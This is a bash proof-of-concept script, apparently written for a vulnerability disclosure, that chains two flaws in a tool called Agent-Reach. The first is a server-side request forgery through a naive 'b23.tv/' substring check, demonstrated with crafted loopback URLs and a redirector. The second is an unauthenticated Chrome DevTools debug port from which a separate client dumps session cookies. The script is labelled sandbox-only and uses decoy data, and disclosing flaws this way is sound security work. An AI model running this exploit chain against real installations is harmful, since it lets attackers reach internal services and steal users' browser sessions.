#!/usr/bin/env bash
# Full chain: F6 (naive-substring SSRF, blind HEAD) + F7 (unauthenticated CDP =
# cookie theft). THROWAWAY SANDBOX ONLY -- decoy data only.
#
# Prereqs in the container:
#   pip install "git+https://github.com/Panniantong/Agent-Reach" websocket-client
#   apt-get update && apt-get install -y chromium   # or chromium-browser
#
# NB: no 'set -e' -- the agent-reach calls are EXPECTED to end in an error
# envelope (the SSRF fires inside _bvid, before the BV-id parse fails).
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
PORT=9222

echo "############################################################"
echo "# PART 1 - F6: naive-substring SSRF  (channels/bilibili.py:_bvid)"
echo "#   gate is only  \"b23.tv/\" in t  ; urllib HEAD follows redirects"
echo "############################################################"
echo "[*] Stand up a fake INTERNAL service on 127.0.0.1:$PORT (CDP/metadata stand-in)."
python3 "$HERE/ssrf_target.py" "$PORT" &
TPID=$!
sleep 1

echo
echo "[*] DIRECT vector: a 'b23.tv/'-substring target pointed straight at loopback."
echo "    \$ agent-reach bilibili read 'http://127.0.0.1:$PORT/json?x=b23.tv/'"
agent-reach bilibili read "http://127.0.0.1:$PORT/json?x=b23.tv/" >/dev/null 2>&1 || true

echo
echo "[*] REDIRECT vector: path contains b23.tv/, attacker 302s into the internal service."
python3 "$HERE/ssrf_redirector.py" 8899 "http://127.0.0.1:$PORT/ssrf-via-redirect" &
RPID=$!
sleep 1
echo "    \$ agent-reach bilibili read 'http://127.0.0.1:8899/b23.tv/go'"
agent-reach bilibili read "http://127.0.0.1:8899/b23.tv/go" >/dev/null 2>&1 || true
sleep 1
kill "$RPID" 2>/dev/null || true
kill "$TPID" 2>/dev/null || true
sleep 1
echo
echo "[=] Saw '*** SSRF LANDED ***'? Attacker input steered Agent-Reach into a loopback"
echo "    target. Blind HEAD: proves the pivot; the body is not reflected back this path."

echo
echo "############################################################"
echo "# PART 2 - F7: unauthenticated CDP debug port = cookie theft"
echo "#   runtime/browser.py:chrome_argv  (127.0.0.1:$PORT, no auth)"
echo "############################################################"
CHROME="$(command -v chromium || command -v chromium-browser || command -v google-chrome || true)"
if [ -z "$CHROME" ]; then
  echo "[!] No chromium found. Install it:  apt-get update && apt-get install -y chromium"
  exit 1
fi
echo "[*] Launch a disposable headless Chrome on the SAME debug port Agent-Reach uses."
"$CHROME" --headless=new --remote-debugging-address=127.0.0.1 --remote-debugging-port="$PORT" \
  --user-data-dir=/tmp/decoy-profile --no-first-run --no-default-browser-check --no-sandbox \
  about:blank >/tmp/chrome.log 2>&1 &
CPID=$!
sleep 3

echo "[*] Victim: plant a DECOY session cookie in that browser."
python3 "$HERE/cdp_seed_cookie.py" || true

echo
echo "[*] Attacker: a SEPARATE client dumps cookies from the unauth port."
python3 "$HERE/cdp_cookie_dump.py" || true

kill "$CPID" 2>/dev/null || true
echo
echo "[=] A separate local client read the browser's cookies with no credentials."
echo "    F6 lets attacker input reach this loopback port through a trusted tool;"
echo "    F7 means the port hands cookies to anything local. Chain complete."
